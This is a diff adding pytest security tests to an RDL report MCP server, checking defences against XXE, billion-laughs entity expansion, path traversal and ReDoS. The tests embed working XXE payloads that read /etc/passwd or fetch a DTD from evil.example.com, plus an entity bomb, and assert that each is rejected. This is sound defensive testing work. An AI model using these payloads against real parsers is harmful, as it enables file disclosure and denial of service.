@@ -806,6 +806,160 @@ class TestErrorHandling:
         assert 'not found' in result['message']
 
 
+class TestSecurityXXE:
+    """Tests for XML External Entity (XXE) prevention (CWE-611, CWE-776)."""
+
+    def test_xxe_external_entity_blocked(self, server):
+        """Verify that XML with external entity declarations is rejected."""
+        xxe_content = '''<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition">
+  <DataSets>
+    <DataSet Name="&xxe;">
+      <Query>
+        <CommandText>test</CommandText>
+      </Query>
+      <Fields/>
+    </DataSet>
+  </DataSets>
+</Report>'''
+
+        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
+            f.write(xxe_content)
+            temp_path = f.name
+
+        try:
+            result = server.validate_rdl(temp_path)
+            # defusedxml should block parsing; validation returns error
+            assert result['valid'] == False
+        finally:
+            os.unlink(temp_path)
+
+    def test_xxe_entity_expansion_bomb_blocked(self, server):
+        """Verify that entity expansion (billion laughs) attacks are rejected."""
+        bomb_content = '''<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition">
+  <DataSets>
+    <DataSet Name="&lol3;">
+      <Query>
+        <CommandText>test</CommandText>
+      </Query>
+      <Fields/>
+    </DataSet>
+  </DataSets>
+</Report>'''
+
+        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
+            f.write(bomb_content)
+            temp_path = f.name
+
+        try:
+            result = server.validate_rdl(temp_path)
+            assert result['valid'] == False
+        finally:
+            os.unlink(temp_path)
+
+    def test_xxe_parameter_injection_blocked(self, server):
+        """Verify XXE is blocked via external DTD reference."""
+        xxe_content = '''<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo SYSTEM "http://evil.example.com/xxe.dtd">
+<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition">
+  <DataSets/>
+</Report>'''
+
+        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
+            f.write(xxe_content)
+            temp_path = f.name
+
+        try:
+            result = server.validate_rdl(temp_path)
+            assert result['valid'] == False
+        finally:
+            os.unlink(temp_path)
+
+
+class TestSecurityPathTraversal:
+    """Tests for path traversal prevention (CWE-22)."""
+
+    def test_non_rdl_extension_rejected(self, server):
+        """Verify that files without .rdl extension are rejected."""
+        with tempfile.NamedTemporaryFile(suffix='.xml', delete=False, mode='w') as f:
+            f.write('<root/>')
+            temp_path = f.name
+
+        try:
+            result = server.describe_rdl_report(temp_path)
+            # Should not succeed with non-rdl file
+            pytest.fail("Expected an error for non-.rdl file")
+        except ValueError as e:
+            assert "Only .rdl files are supported" in str(e)
+        finally:
+            os.unlink(temp_path)
+
+    def test_sensitive_file_read_blocked(self, server):
+        """Verify that reading non-.rdl system files is blocked."""
+        try:
+            result = server.describe_rdl_report('/etc/passwd')
+            pytest.fail("Expected an error for non-.rdl file")
+        except ValueError as e:
+            assert "Only .rdl files are supported" in str(e)
+
+    def test_symlink_resolved(self, server, temp_report):
+        """Verify that symlinks are resolved (preventing symlink-based traversal)."""
+        import rdl_mcp.xml_utils as xml_utils
+
+        # Create a symlink to the .rdl file - this should work fine
+        symlink_path = temp_report + '.link.rdl'
+        try:
+            os.symlink(temp_report, symlink_path)
+            resolved = xml_utils.validate_filepath(symlink_path)
+            # Should resolve to the real path
+            assert resolved == os.path.realpath(temp_report)
+        finally:
+            if os.path.exists(symlink_path):
+                os.unlink(symlink_path)
+
+    def test_empty_filepath_rejected(self, server):
+        """Verify that empty filepath is rejected."""
+        try:
+            server.describe_rdl_report('')
+            pytest.fail("Expected an error for empty filepath")
+        except ValueError as e:
+            assert "non-empty string" in str(e)
+
+    def test_none_filepath_rejected(self, server):
+        """Verify that None filepath is rejected."""
+        try:
+            server.describe_rdl_report(None)
+            pytest.fail("Expected an error for None filepath")
+        except (ValueError, TypeError):
+            pass  # Either error type is acceptable
+
+
+class TestSecurityReDoS:
+    """Tests for Regular Expression Denial of Service prevention (CWE-1333)."""
+
+    def test_long_regex_pattern_rejected(self, server, temp_report):
+        """Verify that excessively long regex patterns are handled safely."""
+        # Create a very long regex pattern
+        long_pattern = 'a' * 201
+        result = server.get_rdl_datasets(temp_report, field_limit=-1, field_pattern=long_pattern)
+        # Should return all fields unfiltered rather than crash
+        assert 'datasets' in result
+
+    def test_invalid_regex_handled_gracefully(self, server, temp_report):
+        """Verify that invalid regex patterns don't crash the server."""
+        result = server.get_rdl_datasets(temp_report, field_limit=-1, field_pattern='[invalid')
+        assert 'datasets' in result
+
+
 class TestFastMCPServer:
     """Tests verifying fastmcp tool registration."""
 
@@ -844,4 +998,5 @@ class TestFastMCPServer:
         assert len(self._get_tools()) == len(self.EXPECTED_TOOLS)
 
 
+if __name__ == '__main__':
     pytest.main([__file__, '-v'])
